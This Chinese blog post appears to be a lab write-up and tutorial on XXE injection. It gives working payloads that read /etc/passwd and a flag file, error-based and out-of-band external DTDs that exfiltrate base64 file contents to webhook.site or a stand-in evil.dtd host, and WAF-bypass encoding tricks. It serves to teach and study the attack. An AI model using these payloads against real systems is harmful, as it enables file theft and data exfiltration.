---
title: 好靶场XSS-地府生死簿
published: 2026-09-20 20:00
description: 不知道怎么偏题从XSS到XXE，XXE从发现XML导入到内联失败、外部DTD参数实体带外拿flag，含libxml特性
tags:
  - XML
  - 靶场
category: 网络安全
draft: false
---
## 有点偏题的靶场/答案?

## 一、XXE 是什么

XML External Entity Injection，XML 外部实体注入

当应用解析用户可控的 XML 时，若允许引用外部实体，攻击者可读取文件、SSRF、带外外带数据

## 二、核心概念（只讲渗透相关）

### 1. DTD 位置：内联 vs 外部

|   类型   |                    写法                     |             渗透用途              |
| :----: | :---------------------------------------: | :---------------------------: |
| 内联 DTD |         `<!DOCTYPE root [ ... ]>`         |  只能做基础回显，libxml 下外部普通实体常不加载   |
| 外部 DTD | `<!DOCTYPE root SYSTEM "http://x/a.dtd">` | 错误型、带外型必须用，可托管在 webhook/自建服务器 |

### 2. 实体类型与攻击角色

|      类型       |                     定义/引用                      |     在 XXE 中的角色      |
| :-----------: | :--------------------------------------------: | :-----------------: |
| 内部实体(写在 XML里) |        `<!ENTITY foo "bar">` / `&foo;`         | 胶水、模板、拆词绕 WAF、测试解析器 |
| 外部实体(放在外部URL) | `<!ENTITY xxe SYSTEM "file:///...">` / `&xxe;` |  读文件、SSRF、带外（核心载荷）  |
|     一般实体      |                `&` 引用，用于 XML 内容                |       回显型 XXE       |
|     参数实体      |                `%` 引用，仅 DTD 内部                 |   带外/错误型必需，用于嵌套构造   |

内部DTD：

```
<?xml version="1.0" encoding="UTF-8"?>          ← XML 声明
<!DOCTYPE stockCheck [                            ← DTD 开始，名字必须和根元素一致
  <!ENTITY xxe SYSTEM "file:///etc/passwd">      ← 实体声明，写在这对 [] 里面
]>                                                ← DTD 结束
<stockCheck>                                      ← 根元素
  <productId>&xxe;</productId>                    ← 引用实体
  <storeId>1</storeId>
</stockCheck>
```

外部DTD：

真正的DTD内容放在外部，比如服务器等的一个文件中

```
<!ENTITY xxe SYSTEM "file:///etc/passwd">
```

XML文件里只写一句引用

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck SYSTEM "http://1.2.3.4/evil.dtd">
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>
```

**关键**：  

- 内部实体不读文件，但没它拼不出带外 payload。  
- 外部实体是攻击本体。  
- 参数实体嵌套时 `%` 写成 `&#x25;`。

## 三、三种利用方式

### 1. 回显型

- 条件：靶场回显 `&xxe;` 结果。
- 内联 DTD：
```xml
<!DOCTYPE stockCheck [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<stockCheck>
	<productId>&xxe;</productId>
</stockCheck>
```
- 缺点：文件内容含 `&`、`<` 会破坏 XML；libxml 内部 DTD 外部普通实体常不加载。

### 2. 错误型（Error-based）

- 条件：靶场回显解析错误。
- 必须用**外部 DTD**，内部 DTD 不支持参数实体嵌套。
- 外部 DTD 内容：
```xml
<!ENTITY % file SYSTEM "file:///tmp/flag.txt">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```
- 靶场 XML：
```xml
<!DOCTYPE stockCheck [
  <!ENTITY % xxe SYSTEM "http://your-server/evil.dtd">
  %xxe;
]>
<stockCheck>
	<productId>1</productId>
</stockCheck>
```
- 报错示例：`failed to load external entity "file:///nonexistent/flag{...}"`

### 3. 带外型（OOB / Blind XXE）

- 条件：靶场不回显，让服务器主动发请求。
- 必须用**外部 DTD** + **参数实体嵌套**。
- 外部 DTD：
```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/tmp/flag.txt">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://webhook.site/xxx?x=%file;'>">
%eval;
%exfil;
```
- 靶场 XML：
```xml
<!DOCTYPE stockCheck [
  <!ENTITY % xxe SYSTEM "https://webhook.site/托管DTD的ID">
  %xxe;
]>
<stockCheck>
	<productId>1</productId>
	<storeId>1</storeId>
</stockCheck>
```
- 接收端：webhook.site、Burp Collaborator、interactsh、自建服务器。
- base64 避免 `{`、`}`、`&` 破坏 URL；不 base64 也能爆 flag，但会报 `Invalid URI`。
- webhook.site 可能 429 限流，可换 Collaborator。

## 四、libxml（PHP simplexml）的坑

|     写法     |        内部 DTD        | 外部 DTD |
| :--------: | :------------------: | :----: |
| 直接定义外部普通实体 | 可定义，但常不加载，`&xxe;` 为空 |  可加载   |
| 参数实体嵌套定义实体 |    **不允许**，直接解析失败    |   允许   |
|  错误型 XXE   |          不行          |   可以   |
|   带外 XXE   |          不行          |   可以   |

**结论**：错误型和带外型必须用外部 DTD；内联普通实体在 libxml 下基本走不通。

## 五、实战流程（靶场案例）
1. 信息收集：`/backup.zip` → 账号 `yan0224` / 密码 `yanluowang`
2. 找入口：留言过滤、上传失败，批量导入解析 XML → XXE
3. 试内联普通实体：
```xml
<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "file:///tmp/flag.txt"> ]>
<stockCheck>
	<productId>&xxe;</productId>
</stockCheck>
```
`productId` 为空 → libxml 不加载内部 DTD 外部实体
4. 改用外部 DTD + 参数实体带外：
   - webhook.site 自定义 Response 作为 DTD：
```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/tmp/flag.txt">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://webhook.site/接收ID?x=%file;'>">
%eval;
%exfil;
```
   - 靶场提交：
```xml
<!DOCTYPE stockCheck [
  <!ENTITY % xxe SYSTEM "https://webhook.site/托管DTD的ID">
  %xxe;
]>
<stockCheck>
	<productId>1</productId>
	<storeId>1</storeId>
</stockCheck>
```
5. 接收数据：webhook 收到 `?x=ZmxhZ3t...`，base64 解码得 flag。

## 六、绕过 WAF 技巧

- 参数实体名拆分：`%fi` `%le` 拼接。
- 关键字编码：`SYSTEM` → `&#x53;YSTEM`，`file` → `fi&#x6c;e`。
- 大小写混写：`<!DoCtYpE`、`<!EnTiTy`。
- 外部 DTD 域名编码：`http://` 写成 `http&#x3a;//`。
- 用 `php://filter` 替代 `file://`，避免 `file` 关键字。
- 带外接收端换 `//` 或 IP 形式，避开黑名单。